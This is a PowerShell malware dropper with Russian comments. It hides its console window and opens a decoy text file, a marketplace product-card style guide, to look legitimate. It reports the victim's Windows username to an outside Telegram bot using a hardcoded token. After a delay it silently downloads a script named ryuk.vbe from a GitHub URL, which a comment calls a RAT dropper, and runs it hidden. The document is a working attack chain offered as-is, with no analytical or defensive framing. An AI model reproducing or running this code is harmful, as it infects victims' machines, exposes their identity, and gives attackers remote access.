# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "ProductCards_StyleGuid.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Назначение

Короткий одностраничный стиль‑гайд для оформления карточек товаров на маркетплейсах. Нормы применимы к трём типам карточек и предназначены для верстки и передачи дизайнерам.
Типографика и цвета

    Заголовки: Arial Bold 14 pt; цвет #2B2B2B.
    Текст: Calibri 11 pt; межстрочный 1.15; цвет #2B2B2B.
    Буллеты: Calibri 11 pt; маркер — круг; длина пункта ≤ 80 символов.
    Акцентный цвет: #0078D4 (ссылки, CTA).
    Цвет предупреждений: #E81123.
    Фон: белый #FFFFFF.

Изображения

    Главное фото: белый фон, 2000×2000 px, JPEG/PNG.
    Доп. фото: процесс применения, до/после, масштаб (рука/линейка).
    Подписи: Calibri 10 pt; цвет #6B6B6B; 1 строка.
    Альт‑текст: обязательный, 1 предложение.

Файловые папки с фото

    Akfix 65гр+200мл
    COSMO FEN 20г
    POXIPOL 14мл
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit